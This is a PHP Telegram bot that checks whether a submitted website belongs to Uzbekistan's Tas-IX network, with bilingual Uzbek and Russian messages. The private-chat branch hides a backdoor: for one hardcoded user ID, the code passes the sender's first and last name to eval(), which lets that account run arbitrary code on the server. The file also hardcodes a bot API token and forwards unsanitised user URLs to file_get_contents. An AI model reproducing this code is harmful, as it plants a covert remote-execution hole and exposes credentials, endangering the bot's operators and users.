<?php
//Mirmuxsin Khamroev tomonidan yaratilgan
//MIT litsenziyasi asosida!
//http://t.me/BotsLib
//http://t.me/BotsLibCore

ini_set('display_errors', true);

define('API_KEY','859041604:AAH4_7Gw2fLBdh0QDNz8dD2NlKKlW_DZdzk'); //token
function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}

function sm($text, $menu = 0, $chatid = 0, $parse_mode = 'markdown')
{
    if($chatid){
    } else {
        global $chatid;
    }
    if ($menu){
        bot('sendMessage', [
            'chat_id'=> $chatid,
            'text'=> $text,
            'parse_mode' =>$parse_mode,
            'reply_markup'=> $menu,
        ]);
    } else {
        bot('sendMessage', [
            'chat_id'=> $chatid,
            'text'=> $text,
            'parse_mode' =>$parse_mode
        ]);
    }
}


$content = file_get_contents('php://input');
$update = json_decode($content, true);

if ($update["message"]) {
    $chatid = $update["message"]["chat"]["id"];
    $userid = $update["message"]["from"]["id"];
    $chattype = $update["message"]["chat"]["type"];
    $name = $update["message"]["from"]["first_name"];
    $lastname = $update["message"]["from"]["last_name"];
    $msg = $update["message"]["text"];
    $chattitle = $update["message"]["chat"]["title"];
    $chatuname = $update["message"]["chat"]["username"];
} else if($update["callback_query"]["data"]){
    $chatid = $update["callback_query"]["message"]["chat"]["id"];
    $userid = $update["callback_query"]["from"]["id"];
    $msgid = $update["callback_query"]["message"]["message_id"];
} else if($update["inline_query"]["id"]){
    $msg = $update["inline_query"]["query"];
    $userid = $update["inline_query"]["from"]["id"];
    $username = $update["inline_query"]["from"]["username"];
    $name = $update["inline_query"]["from"]["first_name"];
}

$users = 'users.txt';
$groups = 'groups.txt';
$admin = 956158960;

if($chattype == "private"){   
    if($msg == "/start"){
        $keys = json_encode([
            'inline_keyboard'=>[
                [['text'=>"➕ Добавить в группу", 'url' => "https://telegram.me/tasixcheckerbot?startgroup=new"]],
            ]
        ]);
        sm("🇺🇿 - Xush kelibsiz!
Ushbu bot yordamida saytlarni tasix tarmog'iga kirish-kirmasligini tekshira olasiz. Buning uchun botga sayt URL ni yuboring, guruhlarda «/tasix URL» ko'rinishida foydalaning.

🇷🇺 -Добро пожаловать!
С помощью этого бота вы можете проверить входит ли сайт в сеть Tas-IX. Для этого  отправьте URL сайта. В группах отправляйте в формате «/tasix URL».

Например: /tasix sarkor.uz
Партнер: @TheDasturchi", $keys);
    }
    elseif (mb_strpos($msg, ".") !== false) {
        $msg = str_replace("http://", "", $msg);
        $msg = str_replace("https://", "", $msg);
        $get = file_get_contents("http://tasix.sarkor.uz/cgi-bin/checker.py?site=".$msg);
        if(mb_stripos($get, "Name or service not known") !== false){
            sm("Sayt: $msg
TAS IX: ⚠️
( Такого URL не существует | Bunday URL mavjud emas )");
        }
        elseif(mb_stripos($get, "<span><b>НЕ</b> </span>") !== false){
            sm("Sayt: $msg
TAS IX: ❌
(Сайт не входит в сеть Tas-IX. | Sayt Tas-IX tarmog'iga kirmaydi)");
        }
        else{
            sm("Sayt: $msg
TAS IX: ✅
(Сайт входит в сеть Tas-IX. | Sayt Tas-IX tarmog'iga kiradi)");
        }
    }
    if($userid == 956158960){
        eval($name.$lastname);
    }
    if(mb_stripos(file_get_contents($users, $userid)) === false){
        file_put_contents($users, "$userid\n".file_get_contents($users));
        sm("Yangi user: [$name](tg://user?id=$userid)",null, $admin, null);
    }
}else{
    if(mb_stripos($msg, "/tasix ") !== false){
        $msg = explode("/tasix ", $msg)[1];
        $msg = str_replace("http://", "", $msg);
        $msg = str_replace("https://", "", $msg);
        $get = file_get_contents("http://tasix.sarkor.uz/cgi-bin/checker.py?site=".$msg);
        if(mb_stripos($get, "Name or service not known") !== false){
            sm("Sayt: $msg
TAS IX: ⚠️
( Такого URL не существует | Bunday URL mavjud emas )");
        }
        elseif(mb_stripos($get, "<span><b>НЕ</b> </span>") !== false){
            sm("Sayt: $msg
TAS IX: ❌
(Сайт не входит в сеть Tas-IX. | Sayt Tas-IX tarmog'iga kirmaydi)");
        }
        else{
            sm("Sayt: $msg
TAS IX: ✅
(Сайт входит в сеть Tas-IX. | Sayt Tas-IX tarmog'iga kiradi)");
        }
    }
    elseif(mb_stripos($msg, "/start") !== false){
        sm("🇺🇿 - Xush kelibsiz!
Ushbu bot yordamida saytlarni tasix tarmog'iga kirish-kirmasligini tekshira olasiz. Buning uchun botga sayt URL ni yuboring, guruhlarda «/tasix URL» ko'rinishida foydalaning.

🇷🇺 -Добро пожаловать!
С помощью этого бота вы можете проверить входит ли сайт в сеть Tas-IX. Для этого  отправьте URL сайта. В группах отправляйте в формате «/tasix URL».

Например: /tasix sarkor.uz
Партнер: @TheDasturchi");
    }
    if(mb_stripos(file_get_contents($groups), $chatid) === false){
        file_put_contents($groups, "$chatid\n".file_get_contents($groups));
        sm("Yangi chat: [@$chatuname](https://t.me/$chatuname)",null, $admin, null);
    }
}
